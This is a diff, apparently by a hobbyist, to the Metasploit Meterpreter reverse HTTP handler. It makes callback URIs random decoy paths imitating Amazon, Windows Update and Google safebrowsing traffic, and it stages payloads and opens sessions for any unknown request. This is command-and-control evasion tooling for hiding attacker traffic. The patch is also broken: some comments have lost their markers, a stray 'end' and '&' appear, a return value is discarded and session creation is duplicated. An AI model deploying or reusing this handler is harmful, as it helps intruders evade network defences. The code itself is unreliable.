@@ -6,7 +6,6 @@ require 'rex/post/meterpreter'
 require 'rex/socket/x509_certificate'
 require 'msf/core/payload/windows/verify_ssl'
 require 'rex/user_agent'
-require 'uri'
 
 module Msf
 module Handler
@@ -112,17 +111,18 @@ module ReverseHttp
   # addresses.
   #
   # @param req [Rex::Proto::Http::Request]
-  # @return [String] A URI of the form +scheme://host:port/+
+  # @return [String] A URI of the form +scheme://host:port/+&
   def payload_uri(req=nil)
     callback_host = nil
     callback_scheme = nil
 
-    # Extract whatever the client sent us in the Host header
+   # Extract whatever the client sent us in the Host header
     if req && req.headers && req.headers['Host']
-      cburi = URI("#{scheme}://#{req.headers['Host']}")
-      callback_host = cburi.host
-      callback_port = cburi.port
-    end
+      callback_host, callback_port = req.headers['Host'].split(":")
+      callback_port = callback_port.to_i
+      callback_port ||= (ssl? ? 443 : 80)
+    
+  end
 
     # Override the host and port as appropriate
     if datastore['OverrideRequestHost'] || callback_host.nil?
@@ -179,18 +179,18 @@ module ReverseHttp
     l = datastore['LURI'] || ""
 
     if l && l.length > 0
-      # strip trailing slashes
+       strip trailing slashes
       while l[-1, 1] == '/'
         l = l[0...-1]
       end
 
-      # make sure the luri has the prefix
+       make sure the luri has the prefix
       if l[0, 1] != '/'
         l = "/#{l}"
       end
 
     end
-
+    
     l.dup
   end
 
@@ -240,7 +240,8 @@ module ReverseHttp
     lookup_proxy_settings
 
     if datastore['IgnoreUnknownPayloads']
-      print_status("Handler is ignoring unknown payloads")
+      payload_count = framework.db.payloads({workspace: framework.db.workspace}).length
+      print_status("Handler is ignoring unknown payloads, there are #{payload_count} UUIDs whitelisted")
     end
   end
 
@@ -300,54 +301,64 @@ protected
     @proxy_settings = info
   end
 
-  #
-  # Parses the HTTPS request
-  #
+ 
+
+
+def custom_uri()
+
+  dico = ["/metro91/admin/1/secure.php",
+  "/metro91/admin/1/ppptp.jpg",
+  "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=book",
+  "/N4215/adj/amzn.us.sr.aps?sz=160x600&oe=oe&sn=91191&s=3717&dc_ref=http%3A%2F%2Fwww.amazon.com",
+  "/c/msdownload/update/others/2013/11/9946821_f5082b842c8abc5c47cfc68f98340ec384b69fa9.cab",
+  "/c/msdownload/update/software/ftpk/2013/11/ie-spelling-nl_3576e6450352dfc0c0892bf62384e75a56d780a7.msu",
+  "/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2"] 
+
+  return dico.sample
+
+end
+
   def on_request(cli, req)
     Thread.current[:cli] = cli
     resp = Rex::Proto::Http::Response.new
     info = process_uri_resource(req.relative_resource)
-    uuid = info[:uuid]
+    uuid = info[:uuid] || Msf::Payload::UUID.new
 
-    if uuid
-      # Configure the UUID architecture and payload if necessary
-      uuid.arch      ||= self.arch
-      uuid.platform  ||= self.platform
+    # Configure the UUID architecture and payload if necessary
+    uuid.arch      ||= self.arch
+    uuid.platform  ||= self.platform
 
-      conn_id = luri
-      if info[:mode] && info[:mode] != :connect
-        conn_id << generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
-      else
-        conn_id << req.relative_resource
-        conn_id = conn_id.chomp('/')
-      end
-
-      request_summary = "#{conn_id} with UA '#{req.headers['User-Agent']}'"
-
-      # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
-      if datastore['IgnoreUnknownPayloads'] && ! framework.db.get_payload({uuid: uuid.puid_hex})
-        print_status("Ignoring unknown UUID: #{request_summary}")
-        info[:mode] = :unknown_uuid
-      end
-
-      # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
-      if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
-        payload_info = {
-            uuid: uuid.puid_hex,
-        }
-        payload = framework.db.get_payload(payload_info)
-        allowed_urls = payload ? payload.urls : []
-        unless allowed_urls.include?(req.relative_resource)
-          print_status("Ignoring unknown UUID URL: #{request_summary}")
-          info[:mode] = :unknown_uuid_url
-        end
-      end
-
-      url = payload_uri(req) + conn_id
-      url << '/' unless url[-1] == '/'
-
+    #conn_id = luri
+    conn_id = custom_uri()
+    if info[:mode] && info[:mode] != :connect
+      #conn_id << generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
+      custom_uri()
     else
-      info[:mode] = :unknown
+      #conn_id << req.relative_resource
+      #conn_id = conn_id.chomp('/')
+      conn_id = custom_uri()    
+    end
+
+    request_summary = "#{conn_id} with UA '#{req.headers['User-Agent']}'"
+
+    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && ! framework.db.get_payload({uuid: uuid.puid_hex})
+      print_status("Ignoring unknown UUID: #{request_summary}")
+      info[:mode] = :unknown_uuid
+    end
+
+    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
+      payload_info = {
+          uuid: uuid.puid_hex,
+          workspace: framework.db.workspace
+      }
+      payload = framework.db.payloads(payload_info).first
+      allowed_urls = payload ? payload.urls : []
+      unless allowed_urls.include?(req.relative_resource)
+        print_status("Ignoring unknown UUID URL: #{request_summary}")
+        info[:mode] = :unknown_uuid_url
+      end
     end
 
     self.pending_connections += 1
@@ -355,6 +366,11 @@ protected
     resp.body = ''
     resp.code = 200
     resp.message = 'OK'
+
+    url = payload_uri(req) + conn_id
+    #url = conn_id
+    #url
+    url << '/' unless url[-1] == '/'
 
     # Process the requested resource.
     case info[:mode]
@@ -396,7 +412,8 @@ protected
           :passive_dispatcher => self.service,
           :dispatch_ext       => [Rex::Post::Meterpreter::HttpPacketDispatcher],
           :conn_id            => conn_id,
-          :url                => url,
+          #:url                => url,
+          :url                => custom_uri(),
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
           :retry_total        => datastore['SessionRetryTotal'].to_i,
@@ -406,11 +423,58 @@ protected
         })
 
       else
-        unless [:unknown, :unknown_uuid, :unknown_uuid_url].include?(info[:mode])
-          print_status("Unknown request to #{request_summary}")
-        end
-        resp.body    = datastore['HttpUnknownRequestResponse'].to_s
-        self.pending_connections -= 1
+       
+#je mettrais un code qui créera la session quoi qu'il y ait comme URI 
+
+          begin
+            blob = self.generate_stage(url: url, uuid: uuid, uri: conn_id)
+            blob = encode_stage(blob) if self.respond_to?(:encode_stage)
+
+            print_status("Staging #{uuid.arch} payload (#{blob.length} bytes) ...")
+
+            resp['Content-Type'] = 'application/octet-stream'
+            resp.body = blob
+
+          rescue NoMethodError
+            print_error("Staging failed. This can occur when stageless listeners are used with staged payloads.")
+            return
+          end
+        create_session(cli, {
+          :passive_dispatcher => self.service,
+          :dispatch_ext       => [Rex::Post::Meterpreter::HttpPacketDispatcher],
+          :conn_id            => conn_id,
+          #:url                => url,
+          :url                => custom_uri(),
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :retry_total        => datastore['SessionRetryTotal'].to_i,
+          :retry_wait         => datastore['SessionRetryWait'].to_i,
+          :ssl                => ssl?,
+          :payload_uuid       => uuid
+        })
+
+
+
+
+
+
+
+#Fin de
+
+
+
+
+
+
+
+
+
+
+        #unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode])
+        #  print_status("Unknown request to #{request_summary}")
+        #end
+        #resp.body    = datastore['HttpUnknownRequestResponse'].to_s
+        #self.pending_connections -= 1
     end
 
     cli.send_response(resp) if (resp)
